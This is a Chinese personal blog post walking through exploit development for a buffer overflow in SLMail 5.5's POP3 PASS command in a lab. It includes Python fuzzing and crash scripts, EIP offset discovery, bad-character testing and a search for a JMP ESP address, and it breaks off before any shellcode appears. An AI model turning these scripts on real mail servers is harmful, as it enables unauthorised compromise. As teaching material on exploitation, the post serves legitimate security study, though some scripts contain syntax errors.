<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>缓冲区溢出 | onejustone'blog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/5.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">缓冲区溢出</h1><a id="logo" href="/.">onejustone'blog</a><p class="description">--保证独立思维 --</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">缓冲区溢出</h1><div class="post-meta">Jun 15, 2016<script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div id="toc" class="toc-article"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-缓冲区"><span class="toc-number">1.</span> <span class="toc-text">0x00 缓冲区</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#缓冲区溢出"><span class="toc-number">1.1.</span> <span class="toc-text">缓冲区溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#如何发现漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">如何发现漏洞?</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Windows-缓冲区溢出"><span class="toc-number">2.</span> <span class="toc-text">0x01 Windows 缓冲区溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-POP3"><span class="toc-number">3.</span> <span class="toc-text">0x02 POP3</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#02-py"><span class="toc-number">3.0.1.</span> <span class="toc-text">02.py</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Debugger"><span class="toc-number">3.1.</span> <span class="toc-text">Debugger</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Attach"><span class="toc-number">3.1.1.</span> <span class="toc-text">Attach</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#正式发起数据请求"><span class="toc-number">3.1.2.</span> <span class="toc-text">正式发起数据请求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#03-py"><span class="toc-number">3.1.3.</span> <span class="toc-text">03.py</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#04-py"><span class="toc-number">3.1.4.</span> <span class="toc-text">04.py</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#05-py"><span class="toc-number">3.1.5.</span> <span class="toc-text">05.py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-模糊测试-Fuzzing"><span class="toc-number">4.</span> <span class="toc-text">0x03 模糊测试(Fuzzing)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#思路"><span class="toc-number">4.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#寻找可存放-shellcode-的内存空间"><span class="toc-number">4.2.</span> <span class="toc-text">寻找可存放 shellcode 的内存空间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#坏字符"><span class="toc-number">4.3.</span> <span class="toc-text">坏字符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#07-py"><span class="toc-number">4.3.1.</span> <span class="toc-text">07.py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-数据重定向"><span class="toc-number">5.</span> <span class="toc-text">0x04 数据重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#如何找"><span class="toc-number">5.1.</span> <span class="toc-text">如何找?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nasm-shell-rb"><span class="toc-number">5.2.</span> <span class="toc-text">nasm_shell.rb</span></a></li></ol></li></ol></div></div><div class="post-content"><h3 id="0x00-缓冲区"><a href="#0x00-缓冲区" class="headerlink" title="0x00 缓冲区"></a>0x00 缓冲区</h3><p>缓冲区其实是内存中的一个片段，用于存放内存中的数据。我们知道程序是动态的，会根据不同的输入，参数等等而产生不同的计算结果，因为计算机程序的应用，使得整个人类的计算能力得到了上帝的技能，但是这也成为了程序的致命弱点，它无法判断哪些输入是有有害的，哪些输入会导致内存溢出或者计算机崩溃。</p>
<p>程序漏洞其本质上是数据与代码边界的混淆不清，从而让程序执行了一些不可预测的指令。</p>
<hr>
<h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h4><p>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被“撑<br>暴”,从而覆盖了相邻内存区域的数据;</p>
<p>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果.</p>
<hr>
<h4 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞?"></a>如何发现漏洞?</h4><p>目前比较主流的发现漏洞的方法有三种方式 :<strong>源码审计</strong> ，<strong>逆向工程</strong>，<strong>模糊测试</strong>。</p>
<hr>
<h3 id="0x01-Windows-缓冲区溢出"><a href="#0x01-Windows-缓冲区溢出" class="headerlink" title="0x01 Windows 缓冲区溢出"></a>0x01 Windows 缓冲区溢出</h3><p>目标环境:SLMail 5.50Mail Server(OS XP;ip:192.168.1.12)<br>动态调试工具:ImmunityDebugger<br>测试脚本:mona.py<br>操作环境:OS:Kali;ip:192.168.1.11<br>ImmunityDebugger 可以调用 py脚本，并且其自动化程序更高。</p>
<p>当 SLMail 邮件服务安装完成以后 <code>netstat -nao</code> 查看端口检测是否安装成功.可以发现，25,110,180等端口都已经开放。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-a6dc28c7dc5d1066.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="SLMail"></p>
<p>Ok,服务器软件安装成功以后便可以安装 Debugger 工具了。</p>
<p>对于 mona.py 脚本程序我们可以在 Github 中获得。</p>
<p>一切安装完成以后，将 <code>mona.py</code> 脚本导入到 <code>Immunity Debugger\PyCommands</code> 目录就好了。</p>
<p>本次实验并不适合在 XP 以上的 window中环境中测试，因为 SLMail 是个很早的软件了，此外从 win7 开始微软便加入了系统级别的 DEP 和 ASLR 防护。</p>
<p>DEP: 结合 CPU 特性，通过软硬件的协同，阻止代码从数据页被执行。这样即使代码存在漏洞，也不会那么容易被直接利用。奈何，黑客的存在就是为了打破规则的，现在 DEP 也被绕的出不多算是个摆设了。所以，微软接着又提出来 ASLR 返回机制。</p>
<p>ASLR: 很久以前，代码在 os  内存中执行的地址是固定，我们甚至可以直接将某个 shell 打到一个指定的内存地址中去执行代码。这种基于静态的内存分配机制很容易被利用。所以，基于动态的，随机内存地址加载执行程序和 DLL内存分配机制便被广泛应用起来。</p>
<hr>
<h3 id="0x02-POP3"><a href="#0x02-POP3" class="headerlink" title="0x02 POP3"></a>0x02 POP3</h3><p>网络协议何止一种，当我遇到不熟悉的网络协议的时候，可以使用 wireshark 去抓包，去分析，了解这个我们原本不熟悉的协议。当然我们现在已经知道 SLMali 中 POP3 协议 的 <code>PASS</code> 命令是存在的，并且存在缓存区溢出的。</p>
<p>使用 <code>pass</code> 对 XP SLMail 100 端口发送数据。但是要发生缓冲区溢出，意味着我们需要对其发送大量的数据，而为了搞清楚到底多大的数据请求会导致其缓冲区溢出，我们需要不断的迭代累加的去发起请求，以次获得最接近的那个临界值，那么，现在从一个简单的 02.py 脚本开始</p>
<h5 id="02-py"><a href="#02-py" class="headerlink" title="02.py"></a>02.py</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"></div><div class="line">import socket</div><div class="line"></div><div class="line">buffer = [&quot;A&quot;]</div><div class="line">counter = 100</div><div class="line">while len(buffer) &lt;= 50:</div><div class="line">	buffer.append(&quot;A&quot; *counter)</div><div class="line">	counter = counter + 200</div><div class="line"></div><div class="line">for string in buffer:</div><div class="line">	print &quot;Fuzzing PASS with %s bytes&quot; % len(string)</div><div class="line">	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">	connect = s.connect((&apos;192.168.1.12&apos;, 110))</div><div class="line">	s.recv(1024)</div><div class="line">	s.send(&apos;USER test&apos;+ &apos;\r\n&apos;)</div><div class="line">	s.recv(1024)</div><div class="line">	s.send(&apos;PASS &apos; + string + &apos;\r\n&apos;)</div><div class="line">	s.send(&apos;QUIT\r\n&apos;)</div><div class="line">	s.close()</div></pre></td></tr></table></figure>
<blockquote>
<p>当然，如果我们已经发送了大量的弹出数据但是依旧没有发生溢出，这时我们可以放弃对这个参数的模糊测试了。</p>
</blockquote>
<hr>
<h4 id="Debugger"><a href="#Debugger" class="headerlink" title="Debugger"></a>Debugger</h4><p>数据一旦发送，便可以打开 XP 中的 Debugger 工具观察服务器状态。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-f9f0948ccd1118ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Dubugger"></p>
<p>我们可在 <code>file&gt;open</code> 直接打开一个 <code>.exe</code> 文件进行静态调试，也可以 <code>file&gt;Attach</code> 选择一个正在运行的程序进行动态调试。</p>
<h5 id="Attach"><a href="#Attach" class="headerlink" title="Attach"></a>Attach</h5><p><img src="http://upload-images.jianshu.io/upload_images/1571420-22627775f9d12909.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Attach"></p>
<p>我们选择 <code>Attach</code> 并对 <code>SLMail</code> 这个程序进行 Attach。但一个正在运行的程序被 <code>Attach</code> 后便会暂停运行，为了观察我们需要让其继续运行起来。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-f22ee3dfd71f9015.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="run again"></p>
<h5 id="正式发起数据请求"><a href="#正式发起数据请求" class="headerlink" title="正式发起数据请求"></a>正式发起数据请求</h5><p>现在我们通过 Kali 运行 02.py 脚本对其发送大量数据</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-b22e7bf55799bb22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Paste_Image.png"></p>
<p>在右侧的 <code>Register</code> 中，<code>EIP</code> 寄存器中所存放的的下一条指令的地址。通过 <code>EIP</code> 寄存器我们做蛮多有意思的事情，就是当发现缓存区溢出以后如去利用。</p>
<p>运行 <code>02.py</code> 脚本程序，我们每次递增 100 个字节向目标服务器发起请求数据，可以看到当发送的字节数达到 3000 bytes 时，程序崩溃了，说明 <code>PASS</code> 指令确实存在缓冲区溢出，而为了得到更加精确的崩溃临界点，我们有了 <code>03.py</code> 脚本程序。</p>
<h5 id="03-py"><a href="#03-py" class="headerlink" title="03.py"></a>03.py</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">import socket</div><div class="line"></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">buffer = &quot;A&quot; * 2700</div><div class="line">try:</div><div class="line">    print &quot;\nSending evil buffer...&quot;</div><div class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</div><div class="line">    print &quot;\nDone!.&quot;</div><div class="line">except:</div><div class="line">    print &quot;Could not connect to POP3&quot;</div></pre></td></tr></table></figure>
<p>通过，<code>03.py</code> 脚本首先发送了 2700 个 “A”,发现程序也崩溃了，于是尝试减少发送的数据量为 2600 个 “A”，发现程序还是崩溃了，但是与 2700 个字符串导致的崩溃不同，2600 个 “A” 并没有完全覆盖 EIP 寄存器，这意味着我们得到了一个区间，在 2700~2600之间，我们离潘多拉的魔盒又近了一步，现在，我们有两种方式去尝试打开盒子，一个是二分法，不断的细分这个区间的值，虽然这种方式有点笨，但是终归是可以找到真理的。或者，可以试试唯一字符串的方式。</p>
<p>Python 中自带了一个能生成唯一字符串的脚本程序 <code>pattern_create.rb</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./usr/shaer/metasploit-framework/tools/exploit/pattern_create.rb 2700</div><div class="line">// 生成2700个唯一字符串 &#123;str&#125;</div></pre></td></tr></table></figure>
<p>我们将 {str} 字符串替换掉 <code>03.py</code> 中的 “A”，得到 <code>04.py</code>：</p>
<h5 id="04-py"><a href="#04-py" class="headerlink" title="04.py"></a>04.py</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">import socket</div><div class="line"></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">buffer = &quot;str&quot;</div><div class="line">try:</div><div class="line">    print &quot;\nSending evil buffer...&quot;</div><div class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</div><div class="line">    print &quot;\nDone!.&quot;</div><div class="line">except:</div><div class="line">    print &quot;Could not connect to POP3&quot;</div></pre></td></tr></table></figure>
<p>再次发送数据，程序崩溃，得到 EIP 寄存器中的数值 <code>39 69 44 38</code><br>计算机和人不一样，它在寄存器中所存储的数据的顺序是从高位向地位的，所以转换为人类的可读顺序就是 <code>38 44 69 39</code>，然后t通过对照 ASCII 码表，我们可以得到其确切的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">十六进制:38 44 69 39</div><div class="line">ASCII:8 D i 9</div></pre></td></tr></table></figure>
<p>进一步执行 <code>exploit</code> 目录下的 <code>pattern_offset.rb</code> 文件便可以得到 <code>39 69 44 38</code> 在唯一字符串中的精准偏移量:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb 39694438</div><div class="line">[*] Exact match at offset 2606</div></pre></td></tr></table></figure>
<p>我们得到了溢出的位置，即是程序是从 2606 这个位置开始崩溃的，但是为了再次验证这个结果可靠性，我们再次对 <code>03.py</code> 脚本进行修改，让其先发送 2606 个 <code>A</code> ，再发送四个 <code>B</code>，接着发送20个 <code>C</code>，然后去观察 <code>Dubugger</code> 调试工具中的 <code>EIP</code> 寄存器是否会被写入4个 <code>B</code>?</p>
<h5 id="05-py"><a href="#05-py" class="headerlink" title="05.py"></a>05.py</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">import socket</div><div class="line"></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">buffer = &quot;A&quot;*2606 + &quot;B&quot;*4 + &quot;C&quot;*20</div><div class="line">try:</div><div class="line">    print &quot;\nSending evil buffer...&quot;</div><div class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</div><div class="line">    print &quot;\nDone!.&quot;</div><div class="line">except:</div><div class="line">    print &quot;Could not connect to POP3&quot;</div></pre></td></tr></table></figure>
<p>我们发现，得到结果和我们预想的一样，程序崩溃后，<code>EIP</code> 被填满了 <code>424242</code> [ B 对应的 ASCII 码是 42]，同时 <code>ESP</code> 被填满了20个 <code>C</code>,如此，我们知道了，程序确是 2606 这个位置发生了溢出，而当溢出后我们便可以从这位置开始写入任意 <code>指令</code> 了。</p>
<blockquote>
<p>潘多拉的魔盒已开，我要进去看看另一个世界的样子</p>
</blockquote>
<hr>
<h3 id="0x03-模糊测试-Fuzzing"><a href="#0x03-模糊测试-Fuzzing" class="headerlink" title="0x03 模糊测试(Fuzzing)"></a>0x03 模糊测试(Fuzzing)</h3><hr>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>我们已经得到了 <code>EIP</code> 的溢出地址，而下一步我们需要将 <code>EIP</code> 修改为 shellcode 代码的内存地址，从而将 shellcode 写入到该地址空间，当程序读取 <code>EIP</code> 寄存器数值时，将跳转到 shellcode 代码段并执行。</p>
<hr>
<h4 id="寻找可存放-shellcode-的内存空间"><a href="#寻找可存放-shellcode-的内存空间" class="headerlink" title="寻找可存放 shellcode 的内存空间"></a>寻找可存放 shellcode 的内存空间</h4><p>通过之前的操作，我们发现原来 <code>ESP</code> 寄存器也是可以被修改的，那么，现在尝试将 <code>ESP</code> 作为 shellcode 的存放空间。</p>
<p>首先，假设目标的内存中可以存放的字符总数是 3500 个，去掉 <code>EIP</code> 寄存器中的 2606+4 个，理论上，<code>ESP</code> 中将会存放 <code>3500-2606+4</code> 个字符,由此，便可以判断 <code>ESP</code> 的容量大小是否可以作为 shellcode 的存放空间。</p>
<p>可在 <code>03.py</code> 脚本的基础上得到 <code>05.py</code>(其实，除了 buffer 不一样， 03.py, 04.py, 05.py, 06.py都是同一个脚本程序)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">import socket</div><div class="line"></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">buffer = &quot;A&quot;*2606 + &quot;B&quot;*4 + &quot;C&quot;*(3500 - 2606 -4)</div><div class="line">try:</div><div class="line">    print &quot;\nSending evil buffer...&quot;</div><div class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</div><div class="line">    print &quot;\nDone!.&quot;</div><div class="line">except:</div><div class="line">    print &quot;Could not connect to POP3&quot;</div></pre></td></tr></table></figure>
<p>同样，我们再次重启 SLMail 服务，并打开 Debugger 调试工具，运行脚本程序。打开 Debugger <code>EIP</code> 的内存地址被精准的修改为 <code>42424242</code>，而 <code>ESP</code> 被填满了很多的 “C”，对 <code>ESP</code> 右键选择 <code>Follow In Dump</code> ，通过界面中的 <code>Address</code> 栏， 同时为了观察的方便，将<code>Hex</code>调整为 <code>16bytes</code> 。</p>
<p>发现最开始出现 “C” 的地址为 <code>EF7A154</code> ，而 “C” 的结束位置是<code>EF7A2F4</code>，通过计算得到其差值为 <code>1A0</code>，装换为十进制为 <code>416</code>。 即是 <code>ESP</code> 寄存器可以存放 <code>416 bytes</code> 的数据，可以满足一条 shellcode 所需的存放空间。</p>
<p>似乎，只需将 shellcode 放进去就好了。。。是，想象是美好的，二进制的世界是残酷的，我们遇到的第一个问题就是 <strong>坏字符</strong>。</p>
<hr>
<h4 id="坏字符"><a href="#坏字符" class="headerlink" title="坏字符"></a>坏字符</h4><p>不同类型的程序，协议，漏洞，会将某些字符认为是坏字符，一旦在内存中出现这些字符，将会导致程序的崩溃或者锁死，或者本过滤，因为这些字符通常有固定的用途。</p>
<p>比如 <code>0x00 空子符</code>,<code>0x0D 回车</code>，但这只是基于我们已知的认知，是否其 <code>ESP</code> 中还存在其他坏字符呢？而如果要对 <code>ESP</code> 注入 shellcode ，又需要先将 <code>ESP</code> 中的坏字符全部挑选出来。</p>
<p>此时，我们需要用到脚本 <code>07.py</code> </p>
<h5 id="07-py"><a href="#07-py" class="headerlink" title="07.py"></a>07.py</h5><p>基本原理:在 ASCII 中一个字符表示一个字节，而一个字节代表一个 8位的二进制数，从[00000000 ~ 11111111] 一共可以表示 256 个可能的字符。</p>
<p>那么，可以发送 0x00 ~ 0xff 共 256 个字符进行测试，以此找出所有的坏字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">import socket</div><div class="line"></div><div class="line">badChars = &#123;&quot;---&quot;</div><div class="line">&quot;---&quot;</div><div class="line">&quot;---&quot;</div><div class="line">&#125;</div><div class="line"></div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">buffer = &quot;A&quot;*2606 + &quot;B&quot;*4 + badChars</div><div class="line">try:</div><div class="line">    print &quot;\nSending evil buffer...&quot;</div><div class="line">    s.connect(&apos;192.168.1.12&quot;, 110)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;USER admin&apos; + &apos;\r\n&apos;)</div><div class="line">    data = s.recv(1024)</div><div class="line">    s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</div><div class="line">    print &quot;\nDone!.&quot;</div><div class="line">except:</div><div class="line">    print &quot;Could not connect to POP3&quot;</div></pre></td></tr></table></figure>
<p>通过对 Dubugger 的观察(即是当程序崩溃是，Address 中出现不连续的字符序列，即可找出坏字符)，我们一共找出了三个坏字符<code>0x00</code>,  <code>0x0A</code>, <code>0x0D</code>。</p>
<hr>
<h3 id="0x04-数据重定向"><a href="#0x04-数据重定向" class="headerlink" title="0x04 数据重定向"></a>0x04 数据重定向</h3><p>我们已经找到了所有的坏字符，现在可以开始进行数据重定向了，即只要将 ESP 的地址替换为 EIP 的值就可以了。但是问题有又来了，计算机 ESP 寄存器的地址是随机变化的，每次开关机，每次运行 SLMail 程序都会随机变化。</p>
<p>面对这个问题，我们的思路如下:</p>
<ul>
<li>首先在内存中寻找内存地址固定的系统模块。</li>
<li>其次在模块中寻找 <code>JMP ESP</code> 指令的地址，再由该指令间接跳转到 <code>ESP</code>，从而执行 <code>shellcode</code>。</li>
<li>然后使用 <code>mona.py</code> 脚本识别内存模块，搜索 <code>return address</code> 是 <code>JMP ESP</code> 的指令模块。</li>
<li>再寻找无 DEP,ALSR 保护的内存地址。</li>
<li>最后，确保内存地址中不包含坏字符。</li>
</ul>
<p>这也是进行缓冲区溢出遇到目标地址随机变化时常用的思路，找到一个内存地址固定不变的系统模块中 <code>JMP ESP</code> 指令所在的地址，通过该地址跳转到 ESP，以不变应万变。</p>
<hr>
<h4 id="如何找"><a href="#如何找" class="headerlink" title="如何找?"></a>如何找?</h4><p><code>mona.py</code> 自带的脚本程序可以很好的帮助我们去发现系统中的 <code>JMP ESP</code> 地址。</p>
<p>在 <code>Immunity Debugger</code> 中输入 <code>!mona modules</code> ,可以得到 SMLMail 程序运行时所调用的系统模块。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-95aefa4e048a68ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="!mona modules"></p>
<p>找到 <code>Rebase</code> ，<code>SafeSEH</code>, <code>ASLR</code>,<code>NXCompat</code> 为 <code>False</code> ，而 <code>OS DLL</code> 为 <code>True</code> 的系统模块。(假如该模块的名称是 <code>USER32.dll</code>)</p>
<hr>
<h4 id="nasm-shell-rb"><a href="#nasm-shell-rb" class="headerlink" title="nasm_shell.rb"></a>nasm_shell.rb</h4><p>Kali 中的 <code>nasm_shell.rb</code> 脚本可以将汇编语言转换为二进制。<br>运行该脚本,将指令 <code>jmp esp</code> 转换为二进制:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:/usr/share/metasploit-framework/tools/exploit# ./nasm_shell.rb </div><div class="line">nasm &gt; jmp esp</div><div class="line">00000000  FFE4       jmp esp</div></pre></td></tr></table></figure>
<p>如上，我们得到了 <code>jmp esp</code> 指令的二进制表示为 <code>FFE4</code>,回到 <code>Debugger</code> 调试工具,使用 <code>!mona find -s &quot;\xff\xe4 -m UERSER32.dll&quot;</code>，去查找 <code>openc32.dll</code> 中是否存在 <code>jmp esp</code> 指令。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-ac1005f109595fdb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="jmp esp"></p>
<p>未完待续。。。</p>
</div><script type="text/javascript" src="/js/share.js?v=0.0.0" async></script><a data-url="http://onejustone.xyz/2016/06/15/缓冲区溢出+Pop3+Fuzzing/" data-id="cj0ura91200o9javsk89w9rqk" class="article-share-link">分享到</a><div class="tags"><a href="/tags/Kali渗透测试/">Kali渗透测试</a></div><div class="post-nav"><a href="/2016/06/15/非加密类型协议分析/" class="pre">非加密类型协议分析</a><a href="/2016/06/15/思维初步/" class="next">思维初步</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://onejustone.xyz"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/JS离线应用与客户端存储/" style="font-size: 15px;">JS离线应用与客户端存储</a> <a href="/tags/Linux进程/" style="font-size: 15px;">Linux进程</a> <a href="/tags/ES6/" style="font-size: 15px;">ES6</a> <a href="/tags/JavaScript/" style="font-size: 15px;">JavaScript</a> <a href="/tags/JS对象/" style="font-size: 15px;">JS对象</a> <a href="/tags/Python爬虫/" style="font-size: 15px;">Python爬虫</a> <a href="/tags/前端模块化/" style="font-size: 15px;">前端模块化</a> <a href="/tags/Node-js/" style="font-size: 15px;">Node.js</a> <a href="/tags/http模块/" style="font-size: 15px;">http模块</a> <a href="/tags/算法入门/" style="font-size: 15px;">算法入门</a> <a href="/tags/Java基础/" style="font-size: 15px;">Java基础</a> <a href="/tags/AngularJS深入/" style="font-size: 15px;">AngularJS深入</a> <a href="/tags/Kali渗透测试/" style="font-size: 15px;">Kali渗透测试</a> <a href="/tags/Web渗透测试/" style="font-size: 15px;">Web渗透测试</a> <a href="/tags/Windows工具篇/" style="font-size: 15px;">Windows工具篇</a> <a href="/tags/工具篇/" style="font-size: 15px;">工具篇</a> <a href="/tags/CSS/" style="font-size: 15px;">CSS</a> <a href="/tags/CSS界面组件/" style="font-size: 15px;">CSS界面组件</a> <a href="/tags/HTML5/" style="font-size: 15px;">HTML5</a> <a href="/tags/Kali第六章/" style="font-size: 15px;">Kali第六章</a> <a href="/tags/被动信息收集/" style="font-size: 15px;">被动信息收集</a> <a 